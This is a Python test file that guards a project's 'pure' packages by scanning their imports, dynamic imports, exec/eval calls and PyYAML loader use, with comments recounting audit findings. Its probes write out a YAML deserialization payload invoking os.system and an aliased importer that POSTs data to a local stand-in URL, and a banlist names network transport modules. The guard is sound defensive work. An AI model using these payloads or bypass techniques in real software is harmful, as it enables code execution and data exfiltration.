"""Invariant 1: the pure packages import no web framework, HTTP client or LLM library.

CLAUDE.md sells telemetry safety on this guard being *structural* — "the pure packages
cannot import an HTTP client, so telemetry can only live in `mendel-api`". For that claim
to hold, the guard has to cover the standard library, where the transports actually live,
and the dynamic import forms, which name their target at runtime.

An audit on 2026-08-03 defeated the first version with four lines:

    import urllib.request, socket, http.client
    importlib.import_module("httpx").post(...)
    __import__("openai").OpenAI()

All of it passed, because the banned list held only third-party names and the walk looked
only at import statements.
"""

import ast
import pathlib
import sys

import pytest

_KIND_OF_DIR = {
    "contracts": "contract",
    "vocabularies": "vocabulary",
    "measurements": "measurement",
    "roles": "role",
    "rules": "rule",
}


def _declared(path, body: str) -> str:
    """Prepend what a fixture's file declares, derived from the directory it is written into.

    Since comeni-registry#1 a declared file says what it is and the loader no longer reads the
    directory. These fixtures still *write* into kind-named directories, which is now only a
    habit — and the habit is what tells this helper which line to add, so the fixtures keep
    their shape and their subject stays readable.

    Idempotent, because several fixtures write a file twice to check that something changed.
    """
    path = pathlib.Path(path)
    # Walk *ancestors*, not just the immediate parent: real layers nest, and
    # `tools/nf-core/fastqc/fastqc.contract.yml` sits two levels down from the directory that
    # names it.
    kind = next(
        (_KIND_OF_DIR[p.name] for p in path.parents if p.name in _KIND_OF_DIR), None
    )
    if kind is None or body.lstrip().startswith("declares:"):
        return body
    header = f"declares: {kind}\n"
    if kind in ("vocabulary", "measurement"):
        header += f"id: {path.name.removesuffix('.yml').removesuffix('.yaml')}\n"
    return header + body

# Two shapes, because the packages genuinely differ. `comeni-core` and `mendel-resolver`
# import almost nothing, so their permitted set can be *closed* — an allowlist has no
# unknown unknowns, and a banlist can only ever forbid what somebody thought of, which is
# exactly how the stdlib transports went unnoticed until the 2026-08-03 audit.
#
# `mendel-compiler` cannot be closed: it must run Nextflow, so it needs `subprocess`, and
# `subprocess` can shell out to `curl`. Pretending otherwise would put a hole inside a set
# whose shape implies there is none. An honest banlist is better than a dishonest allowlist.
CLOSED_PACKAGES = {
    "comeni-core": {
        "collections", "collections.abc", "datetime", "enum", "hashlib", "pathlib",
        "typing", "pydantic", "yaml", "comeni_core",
    },
    "mendel-resolver": {
        "collections", "collections.abc", "enum", "math", "operator", "pathlib", "re",
        "typing", "pydantic", "yaml", "comeni_core", "mendel_resolver",
    },
    "dag-core": {
        "__future__", "collections", "collections.abc", "dataclasses", "typing", "dag_core",
    },
    "wiener-core": {
        "collections", "collections.abc", "datetime", "enum", "typing",
        "pydantic", "comeni_core", "wiener_core",
    },
}
# `re` was added 2026-08-14 for `rules._computed_over` (MD0300, audit A118), and this note
# exists because the guard is supposed to make an addition something somebody argues for.
#
# It is stdlib, does no I/O, and executes no caller-supplied code — `re` compiles patterns,
# it does not evaluate them as expressions, which is the distinction that matters here: the
# whole point of MD0300 is to keep an *expression* out of declared data, so implementing it
# with something that evaluates expressions would be self-defeating. `mendel-compiler`
# already allows it (`modulespec.py` parses `main.nf` with it), so this is a package catching
# up rather than a new capability in the pure set.
#
# The alternative considered and rejected: hand-rolled string scanning, to leave the
# allowlist untouched. Rejected because the check has to distinguish `read_length-1` from
# `paired-end` — a false positive kills a legitimate rule with a diagnostic nobody can turn
# off — and that precision is exactly what a hand-rolled scanner gets subtly wrong.
#
# `enum` was added 2026-08-15 for `premises.PremiseOrigin` (Plan 1.15 Task 1, audit A108),
# and this note exists for the same reason the one above does.
#
# It is stdlib, does no I/O, executes nothing caller-supplied, and reaches no module this
# file cannot see. `comeni-core` has allowed it since the guard was written, and every closed
# vocabulary in this repository is a `StrEnum` — `Tier`, `ValueSource`, `MeasurementKind`,
# `Via`. `PremiseOrigin` is one more of those; this is the first time `mendel-resolver` has
# needed to *declare* a vocabulary rather than read one from `comeni-core`, which is why the
# entry was not already here.
#
# The alternative considered and rejected: string constants. Rejected because an undeclared
# origin then becomes representable — `origin="mesured"` is a live value rather than an
# error — and because `premises._BY_SOURCE` is deliberately total over `ValueSource` and read
# with `[]`, so a new member trips rather than defaulting. That tripwire needs both sides to
# be enums. Same argument as A38's `Via` guard, which earned itself in Plan 1.14.
#
# `math` was added 2026-08-15 for `premises._OPS`'s `log2` (issue #39), and this is the third
# such note.
#
# It is stdlib, does no I/O, executes nothing caller-supplied, and every function in it is a
# pure number-to-number map — which is the strongest form the argument takes anywhere on this
# list. The one thing it could conceivably reach is `math.__loader__`, and the attribute rule
# already refuses a module reached through another module.
#
# The alternative considered and rejected: hand-rolled `log2` from `int.bit_length()`.
# Rejected because it is only correct for integers and `genome_length / 2` is not one — a
# wrong number reaching STAR's `--genomeSAindexNbases` is the class of defect A118 is about,
# and getting it subtly wrong to avoid a stdlib import is the wrong trade.

# `wiener-core` was added 2026-08-24 as a whole package (`docs/design/wiener.md` §3.1), and
# this is the fourth such note — the first for an entry rather than an import.
#
# **The list grew by one package and by no new capability.** Every name on its line already
# appears above: `collections`, `collections.abc`, `enum` and `typing` are vocabulary and
# containers, and `pydantic` and `comeni_core` are what every pure package here is built from.
# A fold over events has no legitimate need to open a socket, which is what makes the entry
# costless in the way `ctypes` was and `subprocess` never could be.
#
# **`datetime` is on the list for the class and never for `datetime.now`**, and that
# distinction is the one thing about this entry worth arguing over: §6.1 says the same run must
# replay to the same decisions, so a clock read inside the fold breaks Wiener's version of
# invariant 10 in the first week. The allowlist cannot express *this name but not that
# attribute of it* — `comeni-core` has carried `datetime` on the same terms since the guard was
# written — so Task 4 adds `test_wiener_core_never_reads_a_clock`, which scans for
# `datetime.now`, `datetime.utcnow` and `time.time` and is watched failing. **Until that task
# lands, this line is the weaker half of a claim** and is written down as such.
#
# The alternative considered and rejected: leave `datetime` off and pass every timestamp as an
# `int`. Rejected because the payload already carries epoch milliseconds (§4.2) and `admit()`
# has to parse `utcTime`, an ISO-8601 string, to get `at_ms` — so the parse happens either way,
# and doing it without `datetime` means hand-rolling ISO-8601, which is the same trade the
# `math` note above rejected for `log2`.

# `dag-core` was added 2026-08-24 (`docs/design/wiener.md` §9.1.1), and it is the fifth such
# note — the second for a whole package rather than an import.
#
# **It is the shortest allowlist on this list and it does not include `comeni_core`.** The
# arithmetic moved out of `mendel_compiler.layout` unchanged, and the one thing that changed is
# that it no longer reads a `PipelineIR`: it lays out a neutral `Graph`, and each half brings
# the adapter that knows what its own artifact is. A package that lays out a graph has no
# business knowing what a pipeline is, and the allowlist is where that is enforced rather than
# hoped for.
#
# `__future__` is here because the moved module carries `from __future__ import annotations` and
# `_outside_allowlist` has no exemption for it. That was found by the plan's own audit (A187)
# rather than by this entry failing, which is the cheaper order.
#
# The alternative considered and rejected: leave the layout in `mendel-compiler` and let Wiener
# import it. Rejected because `test_the_two_halves_share_only_comeni_core` forbids exactly that,
# and correctly — a run graph is not a reason for Wiener to depend on Mendel's compiler.

BANLIST_PACKAGES = ["mendel-compiler"]

IMPURE_PACKAGES: list[str] = ["mendel-forge", "mendel-ai", "mendel-api", "wiener-api"]
"""Packages this file deliberately does not guard, named so that *not* guarding them is a
decision rather than an omission.

`mendel-forge` ingests tool sources and, from Phase 2, calls a model. Invariant 1 names
three packages and this is not one of them — the arrow points mendel-forge -> the pure
packages, and `test_no_pure_package_imports_an_impure_one` is what holds that direction.

`mendel-ai` arrived with forge Phase 2 and is where the network lives — it is the package
the purity guards exist to keep the pure three away from. `mendel-api` is still absent, and
is deliberately *not* listed ahead of time: a name in a classification list that matches no
directory is a guard nobody is running, and `test_every_package_is_classified` refuses that
too.

A67, issue #31: the scan globs `packages/<name>/src`, and a missing directory yields nothing
while the assertion runs over an empty list — so a package intended pure but renamed carries
no guard, and the gate goes green *faster*, which is the direction nobody investigates.
`test_every_package_is_classified` is what makes a new package fail until somebody decides
which of the three lists it belongs in."""

BANNED_PREFIXES = (
    # web frameworks
    "fastapi", "starlette", "django", "flask",
    # third-party clients
    "httpx", "requests", "aiohttp",
    # model libraries
    "litellm", "openai", "anthropic",
    # persistence and queueing
    "sqlalchemy", "arq",
    # stdlib transports — a pure package has no business opening a socket, and
    # urllib.request is every bit an HTTP client.
    "urllib", "http", "socket", "ssl", "ftplib", "smtplib", "telnetlib", "asyncio",
    "xmlrpc", "webbrowser",
    # A61, issue #25. The comment above claimed "stdlib transports" and the list named six of
    # them, which is what an enumeration always does — it forbids what somebody thought of.
    # `logging.handlers.HTTPHandler` is a complete HTTP POST client, and `SocketHandler`,
    # `DatagramHandler` and `SMTPHandler` sit beside it; `socketserver` is exact membership so
    # `socket` never covered it; `multiprocessing.connection.Client` opens a socket by another
    # name. The egress guard learned this lesson and became an allowlist (invariant 14); this
    # one cannot, because the stdlib a pure package legitimately uses is open-ended — so the
    # honest version is a longer list with the reason for each entry written down.
    "logging", "poplib", "imaplib", "socketserver", "multiprocessing", "wsgiref",
    "nntplib", "select", "selectors", "ssl", "email",
    # A60's other half, issue #24. Resolving the alias below catches the *call*; banning the
    # module stops the name being bound at all, and neither has to be complete because both
    # run. `importlib.metadata` stays reachable through `DOTTED_ALLOWED` — it reads installed
    # package versions and transports nothing.
    "importlib",
    # Foreign function interface. `ctypes.CDLL("libc.so.6")` reaches `socket`, `connect` and
    # `send` without touching Python's socket module, so no Python-level audit event fires
    # and the runtime guard sees nothing either. A pure package has no legitimate FFI need —
    # unlike `subprocess`, which `mendel-compiler` genuinely requires — so unlike the rest of
    # this banlist there is no counter-case. Audit A17.
    "ctypes",
)

# Naming a module at runtime defeats any import-statement check.
#
# **Matched through the alias resolver, never against a spelling.** A60: this was compared
# straight against `node.func.id`/`.attr`, so `from importlib import import_module as _load`
# bound the importer under a name the tuple does not contain and `_load('urllib.request')`
# walked past with the scan green. That is A18's defect — and the alias resolver that fixes it
# was already in this file, imported *from here* by `test_construction.py`.
DYNAMIC_IMPORTERS = ("__import__", "import_module")

# `exec` and `eval` need no import at all, and `compile` builds what they run. A pure
# package writing one of these is obtaining a module this file cannot see.
CODE_EXECUTORS = ("exec", "eval", "compile")

# Reaching a module as an *attribute* of an allowed one. `pathlib.os` is the `os` module,
# and `os.system` is process execution; `typing.sys.modules["socket"]` is a socket. Both
# were demonstrated by the 2026-08-06 audit against an unmodified tree, from a file
# importing only `pathlib` and `typing`.
#
# Legitimate submodule access, which is a dotted *name* rather than a way of reaching a
# module nobody imported.
DOTTED_ALLOWED = frozenset({"collections.abc", "os.path", "importlib.metadata"})

# A58. An allowlist over module *names* says nothing about what a listed module can do.
# PyYAML's non-safe loaders are arbitrary code execution — `!!python/object/apply:`
# instantiates any importable callable — and `yaml.unsafe_load` is a single-link attribute on
# an allowlisted module, so nothing above fires: the rule below it triggers only when the
# attribute is itself a module name, and `unsafe_load` is not one.
#
# This closes `yaml`'s surface. It does not close pydantic's, and this file does not claim to:
# cost-raising, not a proof, exactly as invariant 1 says. The general rule is that a closed
# allowlist holds only if each allowlisted module's own surface is also closed.
BANNED_ATTRIBUTES = {
    "yaml": frozenset(
        {
            "load", "unsafe_load", "full_load", "load_all", "unsafe_load_all", "full_load_all",
            "Loader", "UnsafeLoader", "FullLoader",
        }
    ),
}

# The single place a loader may be named. Every other file in the pure packages reads YAML
# through it — `mendel-compiler` included, which only ever calls `yaml.safe_dump` — which is
# what makes the ban above cost nothing. A path, not a module name: an exemption that matched
# a *spelling* would be A60's shape.
ATTRIBUTE_EXEMPT_PATH = "packages/comeni-core/src/comeni_core/yaml_strict.py"


def _bound_modules(tree: ast.AST) -> dict[str, str]:
    """Local name → the module it was bound from. `import yaml as y` gives `{"y": "yaml"}`.

    A58 needs the module behind a name, not the set of names: a rule keyed on the spelling
    `yaml.` would be defeated by an alias, which is exactly A60's shape one rule over.
    """
    bound: dict[str, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                bound[alias.asname or root] = root
    return bound


def _imported_names(tree: ast.AST) -> set[str]:
    """Every name bound to a module by an `import` in this file."""
    bound = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                bound.add(alias.asname or alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom):
            for alias in node.names:
                bound.add(alias.asname or alias.name)
    return bound


def _local_to_imported(tree: ast.AST) -> dict[str, str]:
    """Local name -> the symbol it was imported as, for `from x import y as z`.

    Separate from `_imported_names` because that one answers *is this name a module* and this
    answers *what was this name originally called*. A60 needed the second question and only
    the first was being asked.
    """
    return {
        alias.asname or alias.name: alias.name
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
        for alias in node.names
    }


def _violations(path: pathlib.Path, root: pathlib.Path) -> list[str]:
    tree = ast.parse(path.read_text())
    where = path.relative_to(root)
    bound = _imported_names(tree)
    aliased = _local_to_imported(tree)
    modules = _bound_modules(tree)
    exempt = str(where) == ATTRIBUTE_EXEMPT_PATH
    found: list[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names = [alias.name for alias in node.names]
        elif isinstance(node, ast.ImportFrom) and node.module:
            names = [node.module]
            # A58, third route. `from yaml import unsafe_load` binds the loader as a bare
            # name, so the attribute rule below never sees an attribute to check.
            #
            # No exemption on this route, deliberately. `yaml_strict.py` spells its loader as
            # `yaml.load(..., Loader=...)` — the attribute form — so an `if not exempt` here
            # would be a branch no file takes, and an inert guard is what A14 is about. If
            # that file is ever refactored to a bare-name import, the right answer is to keep
            # the attribute form rather than to widen this.
            banned = BANNED_ATTRIBUTES.get(node.module.split(".")[0], frozenset())
            found += [
                f"{where} imports `{node.module}.{alias.name}` — an allowlisted module's "
                "unsafe surface. Read YAML through `comeni_core.yaml_strict`, the one file "
                "that may name a loader"
                for alias in node.names
                if alias.name in banned
            ]
        elif isinstance(node, ast.Call):
            called = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
            # Resolved before matching, so a rename is not a disguise. A60.
            called = aliased.get(called, called)
            if called in DYNAMIC_IMPORTERS:
                found.append(f"{where} calls {called}() — imports must be statically visible")
            elif called in CODE_EXECUTORS and isinstance(node.func, ast.Name):
                # `ast.Name` only: the *builtin*. `re.compile` is an `ast.Attribute` and is
                # an ordinary method call on a module that is already allowlisted — four of
                # them in `modulespec.py`, which is how this distinction got made.
                found.append(
                    f"{where} calls {called}() — it can obtain any module without an import, "
                    "which is what this file is meant to be able to see"
                )
            continue
        elif isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name):
            # `pathlib.os`, `typing.sys`: a module reached through another module. Raising
            # the cost, **not closing the class** — an attribute chain two links long
            # (`a.b.c`) or one built with `getattr` still walks past this. The runtime
            # assertion in `test_purity_runtime.py` is the check that does not care how
            # the callee was spelled.
            dotted = f"{node.value.id}.{node.attr}"
            if (
                node.value.id in bound
                and node.attr in sys.stdlib_module_names
                and dotted not in DOTTED_ALLOWED
            ):
                found.append(
                    f"{where} reaches `{dotted}` — that is the `{node.attr}` module as an "
                    "attribute of an imported one, which no import statement declares"
                )
            # A58. Resolved through `modules` rather than matched on the spelling `yaml.`,
            # so `import yaml as y` is caught by the same rule — A60 is what a
            # spelling-matched check looks like when it fails.
            if node.attr in BANNED_ATTRIBUTES.get(
                modules.get(node.value.id, ""), frozenset()
            ) and not exempt:
                found.append(
                    f"{where} reaches `{dotted}` — an allowlisted module's unsafe surface. "
                    "PyYAML's non-safe loaders instantiate any importable callable. Read "
                    "YAML through `comeni_core.yaml_strict`, the one file that may name a "
                    "loader"
                )
            continue
        else:
            continue
        # `DOTTED_ALLOWED` carves out the submodules a banned root legitimately carries.
        # `importlib` is banned because `import_module` obtains any module by name, and
        # `importlib.metadata` reads installed package versions and transports nothing — so
        # the carve-out has to apply to the import rule too, not only to the attribute rule
        # below it. It applied to one of the two until A60's ban made the difference visible.
        found += [
            f"{where} imports {n}"
            for n in names
            if n.split(".")[0] in BANNED_PREFIXES and n not in DOTTED_ALLOWED
        ]
    return found


def _outside_allowlist(path: pathlib.Path, root: pathlib.Path, allowed: set[str]) -> list[str]:
    tree = ast.parse(path.read_text())
    where = path.relative_to(root)
    found = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names = [alias.name for alias in node.names]
        elif isinstance(node, ast.ImportFrom) and node.module:
            names = [node.module]
        else:
            continue
        found += [
            f"{where} imports {n}, which is not on this package's allowlist"
            for n in names
            if n.split(".")[0] not in allowed
        ]
    return found


def test_pure_packages_import_nothing_impure():
    root = pathlib.Path(__file__).parent.parent
    violations: list[str] = []
    for pkg, allowed in CLOSED_PACKAGES.items():
        for py in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            violations += _violations(py, root)
            violations += _outside_allowlist(py, root, allowed)
    for pkg in BANLIST_PACKAGES:
        for py in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            violations += _violations(py, root)
    assert violations == [], "Pure packages must not import I/O or model libraries:\n" + "\n".join(
        violations
    )


def test_a_pure_package_cannot_name_an_unsafe_yaml_loader(tmp_path):
    """A58. `yaml` is on the allowlist and `yaml.unsafe_load` is arbitrary code execution:
    `!!python/object/apply:` instantiates any importable callable.

    It is a single-link attribute on an *allowlisted* module, so no rule above sees it — the
    `ast.Attribute` rule fires only when the attribute is itself a module name, and
    `unsafe_load` is not one. That is a whole axis the scan did not model, not the documented
    two-link/`getattr` gap: an allowlist over module names says nothing about what a listed
    module can do.
    """
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(probe, "import yaml\n"
        "def go():\n"
        "    return yaml.unsafe_load("
        "'!!python/object/apply:os.system\\nargs: [id]\\n')\n")
    )
    assert _violations(probe, tmp_path), "yaml.unsafe_load reached os.system with the scan green"


def test_an_aliased_yaml_loader_is_caught_too(tmp_path):
    """A60 is that the dynamic-importer check matches a *spelling*. This rule must not have
    the same shape, so it resolves the local name to the module it was bound from."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "import yaml as y\ndef go():\n    return y.unsafe_load('!!python/none')\n"))
    assert _violations(probe, tmp_path), "an aliased loader walked past the check"


def test_the_strict_loader_is_the_one_exemption():
    """`yaml_strict.py` names `yaml.load` and a `Loader=` on purpose — it is the single place
    a loader may be spelled, and every other file in the pure packages reads through it.
    That is what makes the ban cost nothing."""
    root = pathlib.Path(__file__).parent.parent
    assert _violations(root / ATTRIBUTE_EXEMPT_PATH, root) == []


def test_a_loader_imported_as_a_bare_name_is_caught(tmp_path):
    """A58, third route. `from yaml import unsafe_load` binds the loader as a bare name and
    calls it with no attribute access anywhere — so the attribute rule has nothing to see.
    Three spellings, one capability; the check has to be on the capability."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "from yaml import unsafe_load\ndef go():\n    return unsafe_load('x')\n"))
    assert _violations(probe, tmp_path), "a bare-name loader import walked past the check"


# --- Round four's carried purity findings: A60, A61, A63, A67 -----------------------------


def test_an_aliased_dynamic_importer_is_caught(tmp_path):
    """A60, issue #24. `DYNAMIC_IMPORTERS` was compared against `node.func.id`/`.attr`, so
    the importer could be bound under any name — which is A18's defect exactly, in the one
    rule that had not learned it. `test_purity.py` already held the alias resolver that fixes
    it, and `test_construction.py` imports that resolver *from this file*.

    Reviewer's probe reached `urlopen` from `mendel-compiler` with the guard green.
    """
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(probe, "from importlib import import_module as _load\n"
        "def go(p):\n"
        "    _load('urllib.request').urlopen('http://127.0.0.1:9/c', data=p.encode())\n")
    )
    assert _violations(probe, tmp_path), "an aliased importer obtained urllib with the scan green"


def test_importlib_itself_is_banned(tmp_path):
    """The other half of A60. Resolving the alias catches the call; banning the module stops
    it being bound at all, and the two together mean neither has to be complete."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "import importlib\ndef go():\n    return importlib.import_module('socket')\n"))
    assert _violations(probe, tmp_path)


def test_importlib_metadata_is_still_reachable(tmp_path):
    """The negative that keeps the ban honest. `importlib.metadata` reads installed package
    versions and opens nothing; refusing it would be a check nobody could disable for a
    module that cannot transport anything."""
    probe = tmp_path / "beacon.py"
    probe.write_text(
        _declared(
            probe,
            "import importlib.metadata\ndef v():\n    return importlib.metadata.version('x')\n")
    )
    assert _violations(probe, tmp_path) == []


@pytest.mark.parametrize(
    "module, why",
    [
        ("logging.handlers", "HTTPHandler is a complete HTTP POST client"),
        ("poplib", "a mail transport"),
        ("imaplib", "a mail transport"),
        ("socketserver", "exact membership, so `socket` does not cover it"),
        ("multiprocessing", "multiprocessing.connection.Client opens a socket"),
        ("wsgiref", "a server"),
    ],
)
def test_a_stdlib_transport_is_banned(tmp_path, module, why):
    """A61, issue #25. The banlist claimed to cover "stdlib transports" and enumerated some
    of them — and an enumeration can only forbid what somebody named, which is the same
    lesson the egress guard learned when it became an allowlist."""
    probe = tmp_path / "beacon.py"
    probe.write_text(_declared(probe, f"import {module}\ndef go():\n    return {module}\n"))
    assert _violations(probe, tmp_path), f"{module} — {why}"


def test_every_package_is_classified(): 
    """A67, issue #31. `test_purity.py` and `test_construction.py` glob
    `packages/<name>/src`; a missing directory yields nothing and the assertion runs over an
    empty list. The reviewer mistyped both package keys and got `1 passed` in 0.04s.

    **A package intended pure but renamed silently carries no guard**, and the failure is
    silent in the direction nobody investigates: the gate goes green faster.
    `test_purity_runtime.py` has this guard-of-the-guard and the other two did not.
    """
    root = pathlib.Path(__file__).parent.parent
    on_disk = {p.name for p in (root / "packages").iterdir() if p.is_dir()}
    classified = set(CLOSED_PACKAGES) | set(BANLIST_PACKAGES) | set(IMPURE_PACKAGES)
    assert on_disk == classified, (
        "every package must be classified pure, banlist or explicitly impure — a package "
        "this file has never heard of is a package it is not guarding:\n"
        f"  on disk, unclassified: {sorted(on_disk - classified)}\n"
        f"  classified, not on disk: {sorted(classified - on_disk)}"
    )


def test_each_guarded_package_has_source_to_scan():
    """The other half. A directory that exists and holds no Python is the same silence."""
    root = pathlib.Path(__file__).parent.parent
    for pkg in [*CLOSED_PACKAGES, *BANLIST_PACKAGES]:
        src = root / "packages" / pkg / "src"
        assert src.is_dir(), f"{pkg} is guarded and has no src/ — the scan would find nothing"
        assert list(src.rglob("*.py")), f"{pkg}/src holds no Python; the scan is running on air"


def test_the_attribute_exemption_names_a_file_that_exists():
    """`ATTRIBUTE_EXEMPT_PATH` is the one file allowed to name a YAML loader.

    A path that matches nothing exempts nothing — which would make `yaml_strict.py` itself
    fail the rule it exists to satisfy, loudly. That is the safe direction, and this test is
    here for the same reason the other two are: the direction is an accident of which way the
    check happens to be written, not something to rely on. A67, issue #41.
    """
    root = pathlib.Path(__file__).parent.parent
    assert (root / ATTRIBUTE_EXEMPT_PATH).exists(), (
        f"{ATTRIBUTE_EXEMPT_PATH} does not exist, so the exemption covers nothing"
    )


def _imported_roots(path: pathlib.Path) -> set[str]:
    """The top-level module of every import in a file. AST rather than a substring scan.

    `"mendel_forge" in text` — which the test below uses — matches a docstring, a comment and
    the word in a variable name, and misses nothing only because it over-matches. For an arrow
    between two halves of a product that is not good enough in either direction: a sentence
    naming the other half would fail the build, and nobody would trust the guard afterwards.
    """
    roots: set[str] = set()
    for node in ast.walk(ast.parse(path.read_text())):
        if isinstance(node, ast.Import):
            roots |= {alias.name.split(".")[0] for alias in node.names}
        elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
            roots.add(node.module.split(".")[0])
    return roots


def _half_of(package: str) -> str | None:
    """Which product a package belongs to. `comeni-core` belongs to both and is the point."""
    if package.startswith("mendel-"):
        return "mendel"
    if package.startswith("wiener-"):
        return "wiener"
    return None


def test_the_two_halves_share_only_comeni_core():
    """`docs/design/wiener.md` §3.3, and **it was not built until 2026-08-24**.

    Nothing under `mendel_*` may import `wiener_*`, and nothing under `wiener_*` may import
    `mendel_*` — with the single exception of `comeni_core`, which is the shared artifact
    vocabulary and the reason that package keeps the platform name.

    **The exception is the interesting half.** `wiener-core` reads `Pipeline` because a run is
    a run *of an artifact*; everything else about Mendel — resolution, the registry, the forge —
    is invisible to Wiener, and a laboratory can run Wiener against a pipeline Mendel never
    built. That independence is a feature (§12.1), and it stops being true the first time an
    import crosses.

    **What made this urgent rather than tidy**: phase 3 draws the run graph, `layout.py` lives
    in `mendel-compiler`, and the obvious way to get it is an import. `wiener-core` happens to
    be protected — its allowlist is closed, so any `mendel_*` import fails there already — but
    `wiener-api` is impure and unguarded, and so is every `mendel-*` package in the other
    direction. Both were reverted and watched before this existed: green, twice.
    """
    root = pathlib.Path(__file__).parent.parent
    packages = sorted(p.name for p in (root / "packages").iterdir() if p.is_dir())
    halves = {name: _half_of(name) for name in packages}
    assert {"mendel", "wiener"} <= set(halves.values()), (
        f"this scan found no two halves to keep apart: {halves}"
    )

    offences: list[str] = []
    for package, half in halves.items():
        if half is None:
            continue
        forbidden = "wiener_" if half == "mendel" else "mendel_"
        for path in sorted((root / "packages" / package / "src").rglob("*.py")):
            crossed = sorted(r for r in _imported_roots(path) if r.startswith(forbidden))
            if crossed:
                offences.append(f"{path.relative_to(root)} imports {', '.join(crossed)}")

    assert offences == [], (
        "the two halves of the product may share only `comeni_core`:\n  "
        + "\n  ".join(offences)
        + "\nA run is a run OF an artifact, so `wiener-core` reads `Pipeline` — and nothing "
          "else about Mendel is Wiener's to see. docs/design/wiener.md §3.3."
    )


def test_no_pure_package_imports_an_impure_one():
    """The dependency arrow, asserted rather than assumed.

    `mendel-forge` importing `mendel-resolver` is the design. The reverse would put an
    impure package inside the purity boundary by transitivity, and the AST scan would
    not see it — it scans the pure packages' own imports, and `mendel_forge` is not on
    any banlist because it is not supposed to be reachable at all.
    """
    root = pathlib.Path(__file__).parent.parent
    offenders = []
    for pkg in [*CLOSED_PACKAGES, *BANLIST_PACKAGES]:
        for path in sorted((root / "packages" / pkg / "src").rglob("*.py")):
            if "mendel_forge" in path.read_text():
                offenders.append(str(path.relative_to(root)))
    assert offenders == [], (
        "a pure package references mendel_forge; the dependency arrow points the other "
        f"way: {offenders}"
    )
